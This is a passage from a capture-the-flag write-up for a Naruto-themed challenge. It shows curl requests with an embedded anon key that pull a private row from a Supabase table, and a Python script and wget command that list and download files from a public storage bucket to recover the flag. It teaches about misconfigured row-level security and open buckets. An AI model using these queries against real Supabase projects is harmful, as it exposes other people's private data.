Content"}},"tags":["pain_paths"]}}},"definitions":{"pain_paths":{"required":["id","created_at"],"properties":{"id":{"default":"gen_random_uuid()","description":"Note:\nThis is a Primary Key.<pk/>","format":"uuid","type":"string"},"created_at":{"default":"now()","format":"timestamp with time zone","type":"string"},"name":{"format":"text","type":"string"},"image_url":{"format":"text","type":"string"},"description":{"format":"text","type":"string"},"ability":{"format":"text","type":"string"},"is_private":{"default":false,"format":"boolean","type":"boolean"}},"type":"object"}},"parameters":{"preferParams":{"name":"Prefer","description":"Preference","required":false,"enum":["params=single-object"],"in":"header","type":"string"},"preferReturn":{"name":"Prefer","description":"Preference","required":false,"enum":["return=representation","return=minimal","return=none"],"in":"header","type":"string"},"preferCount":{"name":"Prefer","description":"Preference","required":false,"enum":["count=none"],"in":"header","type":"string"},"preferPost":{"name":"Prefer","description":"Preference","required":false,"enum":["return=representation","return=minimal","return=none","resolution=ignore-duplicates","resolution=merge-duplicates"],"in":"header","type":"string"},"select":{"name":"select","description":"Filtering Columns","required":false,"in":"query","type":"string"},"on_conflict":{"name":"on_conflict","description":"On Conflict","required":false,"in":"query","type":"string"},"order":{"name":"order","description":"Ordering","required":false,"in":"query","type":"string"},"range":{"name":"Range","description":"Limiting and Pagination","required":false,"in":"header","type":"string"},"rangeUnit":{"name":"Range-Unit","description":"Limiting and Pagination","required":false,"default":"items","in":"header","type":"string"},"offset":{"name":"offset","description":"Limiting and Pagination","required":false,"in":"query","type":"string"},"limit":{"name":"limit","description":"Limiting and Pagination","required":false,"in":"query","type":"string"},"body.pain_paths":{"name":"pain_paths","description":"pain_paths","required":false,"in":"body","schema":{"$ref":"#/definitions/pain_paths"}},"rowFilter.pain_paths.id":{"name":"id","required":false,"in":"query","type":"string"},"rowFilter.pain_paths.created_at":{"name":"created_at","required":false,"in":"query","type":"string"},"rowFilter.pain_paths.name":{"name":"name","required":false,"in":"query","type":"string"},"rowFilter.pain_paths.image_url":{"name":"image_url","required":false,"in":"query","type":"string"},"rowFilter.pain_paths.description":{"name":"description","required":false,"in":"query","type":"string"},"rowFilter.pain_paths.ability":{"name":"ability","required":false,"in":"query","type":"string"},"rowFilter.pain_paths.is_private":{"name":"is_private","required":false,"in":"query","type":"string"}},"externalDocs":{"description":"PostgREST Documentation","url":"https://postgrest.org/en/v12/references/api.html"}}⏎
```

we then query the table and get the result.

```bash
❯ curl --request GET \
        --url https://qzuqulwyiktbcmtjipsr.supabase.co/rest/v1/pain_paths \
        --header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF6dXF1bHd5aWt0YmNtdGppcHNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwODY5NzIsImV4cCI6MjA2MTY2Mjk3Mn0.nzqx2c336xykkqlyCVfH8iHq5AZpT6wzC_gtJTHZ_3I' \
        --header 'User-Agent: insomnia/10.3.1' \
        --header 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF6dXF1bHd5aWt0YmNtdGppcHNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwODY5NzIsImV4cCI6MjA2MTY2Mjk3Mn0.nzqx2c336xykkqlyCVfH8iHq5AZpT6wzC_gtJTHZ_3I'
[{"id":"7a306970-69f2-4e51-815f-70a4f2d1a7d6","created_at":"2025-05-01T08:38:31.216964+00:00","name":"{m15configur3d_RL5_","image_url":"","description":"Controls attractive and repulsive forces. Most notable for the Shinra Tensei and Chibaku Tensei techniques.","ability":"Gravitational manipulation","is_private":true},
 {"id":"16082e31-da0e-497a-bc0d-7b0d73696488","created_at":"2025-05-01T08:38:31.216964+00:00","name":"Animal Path","image_url":"https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/animal.jpg","description":"Summons a variety of creatures to aid in battle, all of which are also controlled via the Rinnegan.","ability":"Summoning powerful beasts","is_private":false},
 {"id":"73fdb860-9aac-49fb-9290-4a6637ecde58","created_at":"2025-05-01T08:38:31.216964+00:00","name":"Preta Path","image_url":"https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/preta.jpg","description":"Able to absorb chakra and nullify ninjutsu attacks.","ability":"Chakra absorption","is_private":false},
 {"id":"74abac58-dcbe-4e8c-b7d3-ba65dd46fde7","created_at":"2025-05-01T08:38:31.216964+00:00","name":"Asura Path","image_url":"https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/asura.jpg","description":"Augments the user's body with mechanized weaponry, turning them into a living arsenal.","ability":"Mechanical body enhancements","is_private":false},
 {"id":"797fae10-445f-4f9b-b513-0b2513749c52","created_at":"2025-05-01T08:38:31.216964+00:00","name":"Human Path","image_url":"https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/human.jpg","description":"Can read minds and rip out souls by physical contact.","ability":"Soul extraction and mind reading","is_private":false},
 {"id":"df91ce28-3ef9-4e33-bf7a-8710314874b1","created_at":"2025-05-01T08:38:31.216964+00:00","name":"Naraka Path","image_url":"https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/naraka.jpg","description":"Summons the King of Hell for interrogation and restoration.","ability":"Interrogation and healing via the King of Hell","is_private":false}]
```

We get the first part of flag from this `[{"id":"7a306970-69f2-4e51-815f-70a4f2d1a7d6","created_at":"2025-05-01T08:38:31.216964+00:00","name":"{m15configur3d_RL5_","image_url":"","description":"Controls attractive and repulsive forces. Most notable for the Shinra Tensei and Chibaku Tensei techniques.","ability":"Gravitational manipulation","is_private":true},`

We notice that the images have urls `https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/animal.jpg` which can be accessed publicly by anyone. That means the supabase bucket can be accessed by anyone publicly. We need to write a small script to get all files in the bucket.

```python
from supabase import create_client, Client

# Initialize Supabase client
supabase_url = "https://qzuqulwyiktbcmtjipsr.supabase.co"
supabase_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF6dXF1bHd5aWt0YmNtdGppcHNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwODY5NzIsImV4cCI6MjA2MTY2Mjk3Mn0.nzqx2c336xykkqlyCVfH8iHq5AZpT6wzC_gtJTHZ_3I"
supabase: Client = create_client(supabase_url, supabase_key)


async def list_files_in_folder():
    try:
        response = supabase.storage.from_("pain-paths").list(path="files")

        files = response
        print(f"Found {len(files)} files:")
        for file in files:
            print(file["name"])

        return files

    except Exception as e:
        print(f"Error listing files: {e}")
        raise


# To run the async function, you can use asyncio
import asyncio

asyncio.run(list_files_in_folder())
```

This gives us this result. We notice a file `deva_path.txt`.

```bash
❯ python main.py
Found 7 files:
animal.jpg
asura.jpg
deva_path.txt
.emptyFolderPlaceholder
human.jpg
naraka.jpg
preta.jpg
```

we get the file

```
❯ wget https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1/object/public/pain-paths/files/deva_path.txt
```

Finally the flag.

```bash
❯ cat deva_path.txt
w1th_public_1n53cur3_bucket5_438da8e103ca6a1015afc1f9de3c13c8}
```

It was all about misconfigured `RLS` policies in supabase and public buckets.

Feel pain. Accept pain. But mostly feel dumb after seeing the solution.

![yay](2.gif)
